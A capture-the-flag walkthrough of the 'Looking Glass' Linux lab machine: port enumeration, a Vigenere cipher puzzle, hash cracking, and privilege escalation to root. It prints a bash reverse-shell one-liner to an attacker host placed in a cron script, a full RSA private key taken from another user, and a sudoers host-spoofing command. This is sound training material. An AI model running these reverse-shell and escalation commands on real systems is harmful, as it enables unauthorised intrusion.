# Looking Glass - Linux - Medium

**IP/ports may vary over the document. Every time the machine is rebooted, new port may be selected for the correct service.**

---

## Enumeration

### Nmap : `sudo nmap -sV -oN nmap-initial -v 10.10.89.5`

```bash
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9009/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9010/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9011/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9040/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9050/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9071/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9080/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9081/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9090/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9091/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9099/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9100/tcp  open  jetdirect?
9101/tcp  open  jetdirect?
9102/tcp  open  jetdirect?
9103/tcp  open  jetdirect?
9110/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9111/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9200/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9207/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9220/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9290/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9415/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9418/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9485/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9500/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9502/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9503/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9535/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9575/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9593/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9594/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9595/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9618/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9666/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9876/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9877/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9878/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9898/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9900/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9917/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9929/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9943/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9944/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9968/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9998/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9999/tcp  open  ssh        Dropbear sshd (protocol 2.0)
10000/tcp open  ssh        Dropbear sshd (protocol 2.0)
10001/tcp open  ssh        Dropbear sshd (protocol 2.0)
10002/tcp open  ssh        Dropbear sshd (protocol 2.0)
10003/tcp open  ssh        Dropbear sshd (protocol 2.0)
10004/tcp open  ssh        Dropbear sshd (protocol 2.0)
10009/tcp open  ssh        Dropbear sshd (protocol 2.0)
10010/tcp open  ssh        Dropbear sshd (protocol 2.0)
10012/tcp open  ssh        Dropbear sshd (protocol 2.0)
10024/tcp open  ssh        Dropbear sshd (protocol 2.0)
10025/tcp open  ssh        Dropbear sshd (protocol 2.0)
10082/tcp open  ssh        Dropbear sshd (protocol 2.0)
10180/tcp open  ssh        Dropbear sshd (protocol 2.0)
10215/tcp open  ssh        Dropbear sshd (protocol 2.0)
10243/tcp open  ssh        Dropbear sshd (protocol 2.0)
10566/tcp open  ssh        Dropbear sshd (protocol 2.0)
10616/tcp open  ssh        Dropbear sshd (protocol 2.0)
10617/tcp open  ssh        Dropbear sshd (protocol 2.0)
10621/tcp open  ssh        Dropbear sshd (protocol 2.0)
10626/tcp open  ssh        Dropbear sshd (protocol 2.0)
10628/tcp open  ssh        Dropbear sshd (protocol 2.0)
10629/tcp open  ssh        Dropbear sshd (protocol 2.0)
10778/tcp open  ssh        Dropbear sshd (protocol 2.0)
11110/tcp open  ssh        Dropbear sshd (protocol 2.0)
11111/tcp open  ssh        Dropbear sshd (protocol 2.0)
11967/tcp open  ssh        Dropbear sshd (protocol 2.0)
12000/tcp open  ssh        Dropbear sshd (protocol 2.0)
12174/tcp open  ssh        Dropbear sshd (protocol 2.0)
12265/tcp open  ssh        Dropbear sshd (protocol 2.0)
12345/tcp open  ssh        Dropbear sshd (protocol 2.0)
13456/tcp open  ssh        Dropbear sshd (protocol 2.0)
13722/tcp open  ssh        Dropbear sshd (protocol 2.0)
13782/tcp open  ssh        Dropbear sshd (protocol 2.0)
13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User.txt

There are a lot of open ports. Connecting to any port other than 22 with username as *alice* gives either *Lower* or *Higher* as output. In order to find the correct port I just did bruteforce using a bash script.

Before the script is executed we need to take care of the message that is shown by ssh when connecting to a new host. It always ends up asking *Do you want to connect or not (yes/no)*. As we are dealing with a lot of ports it is better to turn this feature of.

**SSH configurations as explained in manpage**

```bash
StrictHostKeyChecking
             If this flag is set to yes, ssh(1) will never automatically add host keys to the ~/.ssh/known_hosts file,
             and refuses to connect to hosts whose host key has changed.  This provides maximum protection against man-
             in-the-middle (MITM) attacks, though it can be annoying when the /etc/ssh/ssh_known_hosts file is poorly
             maintained or when connections to new hosts are frequently made.  This option forces the user to manually
             add all new hosts.

             If this flag is set to “accept-new” then ssh will automatically add new host keys to the user known hosts
             files, but will not permit connections to hosts with changed host keys.  If this flag is set to “no” or
             “off”, ssh will automatically add new host keys to the user known hosts files and allow connections to
             hosts with changed hostkeys to proceed, subject to some restrictions.  If this flag is set to ask (the de‐
             fault), new host keys will be added to the user known host files only after the user has confirmed that is
             what they really want to do, and ssh will refuse to connect to hosts whose host key has changed.  The host
             keys of known hosts will be verified automatically in all cases.
```

This can be done in two ways: 

[+] Just use *--StrictHostKeyChecking* as command line argument with ssh command when connecting.

[+] Change the *StrictHostKeyChecking* configuration in */etc/ssh/ssh_config* file from `ask` (default) to `accept-new`

I ended up using the second option hence the bash script was made accordingly.

Executing the [bash script](find_port_range.sh) we get following output:

```bash
9000: Lower
9001: Lower
9002: Lower
9003: Lower
9009: Lower
9010: Lower
9011: Lower
9040: Lower
9050: Lower
9071: Lower
9080: Lower
9081: Lower
9090: Lower
9091: Lower
9099: Lower
9100: Lower
9101: Lower
9102: Lower
9103: Lower
9110: Lower
9111: Lower
9200: Lower
9207: Lower
9220: Lower
9290: Lower
9415: Lower
9418: Lower
9485: Lower
9500: Lower
9502: Lower
9503: Lower
9535: Lower
9575: Lower
9593: Lower
9594: Lower
9595: Lower
9618: Lower
9666: Lower
9876: Lower
9877: Lower
9878: Lower
9898: Lower
9900: Lower
9917: Lower
9929: Lower
9943: Lower
9944: Lower
9968: Lower
9998: Lower
9999: Lower
10000: Lower
10001: Lower
10002: Lower
10003: Lower
10004: Lower
10009: Lower
10010: Lower
10012: Lower
10024: Lower
10025: Lower
10082: Lower
10180: Lower
10215: Lower
10243: Lower
10566: Lower
10616: Lower
10617: Lower
10621: Lower
10626: Lower
10628: Lower
10629: Lower
10778: Lower
11110: Lower
11111: Lower
11967: Lower
12000: Lower
12174: Lower
12265: Lower
12345: Lower
13456: Higher
13722: Higher
```  

There is just *Lower/Higher* in the output file with port **12345** having last *Lower* and port **13456** having first *Higher* message. This means the port is between them. Time for another nmap scan.

```bash
sudo nmap -p12345-13456 10.10.34.51 | grep -E "^[0-9]+" | cut -d"/" -f1 > port_list
```

Above command would create a file named *port_list* containing list of open ports between the ports **12345** and **13456** with every port on a new line.

Hmm.. now there are even more ports, this might take a long time to finish if done with bruteforce time to apply some algorithms. 

Created [*check_port.py*](check_port.py) python script by using [binary search algorithm](https://en.wikipedia.org/wiki/Binary_search_algorithm). This will be lot faster. 

After the script was done executing the port for me was at **13076**

Using `ssh` to connect to port

```bash
$ ssh alice@10.10.34.51 -p13076
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
```

At first sight it looks like Ceaser cipher. It wasn't. Now the only hint I had was the word *jabberwocky*. Again nothing. At this point I started checking for every possible cipher I could think of. Started with Vigenere and yupp I was lucky. It was that. 

Used this [vigenere cipher decoder](https://www.boxentriq.com/code-breaking/vigenere-cipher) and setting the *maximum key length* to 30 characters.

Decoded plain text:

```bash
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
```

**The secret can be different everytime the box is booted.**

```bash
Enter Secret:
jabberwock:MerrilySmileExtremelyReasonable
```

After submitting the secret we got credentials. Using ssh to jabberwock on port 22 with the creds.

**Even the password is changed everytime the box is booted. It just combines 4 words to form a password.**

After logging in as *jabberwocky* the user flag can be found in */home/jabberwocky/user.txt* as reversed string. Using `rev` will reverse the reversed flag.

## Root.txt

Some manual enumeration results:

[+] Doing `sudo -l` reveals */sbin/reboot* can be used by user *jabberwocky*.

[+] Checking directory */etc/sudoers.d/* we have a file with name *alice* and owner being *alice*.

[+] Checking contents of */etc/crontab* reveals something:
```bash
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

The script *twasBrillig.sh* is owned and writable by *jabberwocky*. Changing the contents of *twasBrillig.sh* file to get a reverse shell.

```bash
bash -i >& /dev/tcp/<attacker-IP>/<port> 0>&1
```

Make sure to start a `netcat` listener on the attackers machine. After this just reboot the system using:

```bash
sudo /sbin/reboot
```

After the box is rebooted we get a reverse shell back as user *tweedledum*. Checking `sudo -l` and we get the following:

```bash
$ sudo -l
Matching Defaults entries for tweedledum on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledum may run the following commands on looking-glass:
    (tweedledee) NOPASSWD: /bin/bash
```

Switching to tweedledee and checking `sudo -l` we get the following:

```bash
$ sudo -l
Matching Defaults entries for tweedledee on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledee may run the following commands on looking-glass:
    (tweedledum) NOPASSWD: /bin/bash
```

Damn... this is just going back and forth. Going back to being user *tweedledum* and checking the contents of the file poem.txt

```bash
cat poem.txt
     'Tweedledum and Tweedledee
      Agreed to have a battle;
     For Tweedledum said Tweedledee
      Had spoiled his nice new rattle.

     Just then flew down a monstrous crow,
      As black as a tar-barrel;
     Which frightened both the heroes so,
      They quite forgot their quarrel.'
```

When looking at this poem after I went back and forth between *tweedledum* and *tweedledee*it kind of hints towards this: *They quite forgot their quarrel*.

Taking a Look at *humptydumpty.txt* 
 
```bash
$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

It looks like some SHA256 hashes. Using [crackstation](https://crackstation.net/) to crack:

```bash
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9	sha256	maybe
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed	sha256	one
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624	sha256	of
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f	sha256	these
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6	sha256	is
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0	sha256	the
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8	sha256	password
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b	Unknown	Not found.
```

Apparently the last one is not a hash. Decoding it from hex to ascii gives the following string back: `the password is zyxwvutsrqponmlk`

This can be used as credentials for user *humptydumpty*. After logging in and checking the contents of */home/humptydumpty/poem.txt* we have:

```bash
‘You seem very clever at explaining words, Sir,’ said Alice. ‘Would you kindly tell me the meaning of the poem called “Jabberwocky”?’

‘Let’s hear it,’ said Humpty Dumpty. ‘I can explain all the poems that were ever invented—and a good many that haven’t been invented just yet.’

This sounded very hopeful, so Alice repeated the first verse:

     ‘Twas brillig, and the slithy toves
      Did gyre and gimble in the wabe;
     All mimsy were the borogoves,
      And the mome raths outgrabe.
‘That’s enough to begin with,’ Humpty Dumpty interrupted: ‘there are plenty of hard words there. “Brillig” means four o’clock in the afternoon—the time when you begin broiling things for dinner.’

‘That’ll do very well,’ said Alice: ‘and “slithy”?’

‘Well, “slithy” means “lithe and slimy.” “Lithe” is the same as “active.” You see it’s like a portmanteau—there are two meanings packed up into one word.’

‘I see it now,’ Alice remarked thoughtfully: ‘and what are “toves”?’

‘Well, “toves” are something like badgers—they’re something like lizards—and they’re something like corkscrews.’

‘They must be very curious looking creatures.’

‘They are that,’ said Humpty Dumpty: ‘also they make their nests under sun-dials—also they live on cheese.’

‘And what’s the “gyre” and to “gimble”?’

‘To “gyre” is to go round and round like a gyroscope. To “gimble” is to make holes like a gimlet.’

‘And “the wabe” is the grass-plot round a sun-dial, I suppose?’ said Alice, surprised at her own ingenuity.

‘Of course it is. It’s called “wabe,” you know, because it goes a long way before it, and a long way behind it—’

‘And a long way beyond it on each side,’ Alice added.

‘Exactly so. Well, then, “mimsy” is “flimsy and miserable” (there’s another portmanteau for you). And a “borogove” is a thin shabby-looking bird with its feathers sticking out all round—something like a live mop.’

‘And then “mome raths”?’ said Alice. ‘I’m afraid I’m giving you a great deal of trouble.’

‘Well, a “rath” is a sort of green pig: but “mome” I’m not certain about. I think it’s short for “from home”—meaning that they’d lost their way, you know.’

‘And what does “outgrabe” mean?’

‘Well, “outgrabing” is something between bellowing and whistling, with a kind of sneeze in the middle: however, you’ll hear it done, maybe—down in the wood yonder—and when you’ve once heard it you’ll be quite content. Who’s been repeating all that hard stuff to you?’

‘I read it in a book,’ said Alice. ‘But I had some poetry repeated to me, much easier than that, by—Tweedledee, I think it was.’

‘As to poetry, you know,’ said Humpty Dumpty, stretching out one of his great hands, ‘I can repeat poetry as well as other folk, if it comes to that—’

‘Oh, it needn’t come to that!’ Alice hastily said, hoping to keep him from beginning.
```

`sudo -l` reveals nothing.

Checking the contents of */home* dir we can see that *alice* dir has execute permissions set for it. Now this might be a problem.

```bash
For directories, when a directory's sticky bit is set, the filesystem treats the files in such directories in a special way so only the file's owner, the directory's owner, or root user can rename or delete the file. Without the sticky bit set, any user with write and execute permissions for the directory can rename or delete contained files, regardless of the file's owner. Typically this is set on the /tmp directory to prevent ordinary users from deleting or moving other users' files. 
```

[Source](https://en.wikipedia.org/wiki/Sticky_bit)

[Reference](https://unix.stackexchange.com/questions/21251/execute-vs-read-bit-how-do-directory-permissions-in-linux-work)

As we can access the files inside */home/alice* directory we can probably see the private ssh key.

```bash
$ cat /home/alice./ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

Copying the contents of *id_rsa* file to attacker's machine and using ssh to connect to *alice*

```bash
ssh alice@10.10.89.5 -i id_rsa
```

Once logged in as alice. We can access that */etc/sudoer.d/alice* file

```bash
$ cat /etc/sudoers.d/alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

Executing the following command we get:
```bash
$ sudo -l -h ssalg-gnikool
sudo: unable to resolve host ssalg-gnikool
Matching Defaults entries for alice on ssalg-gnikool:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on ssalg-gnikool:
    (root) NOPASSWD: /bin/bash
```

So *alice* can run `bash` as *root*. Switching to user *root*

```bash
sudo -h ssalg-gnikool /bin/bash
```

Now we are root, the flag is located at */root/root.txt*. It is again reversed hence just use `rev` to reverse the reversed string. 

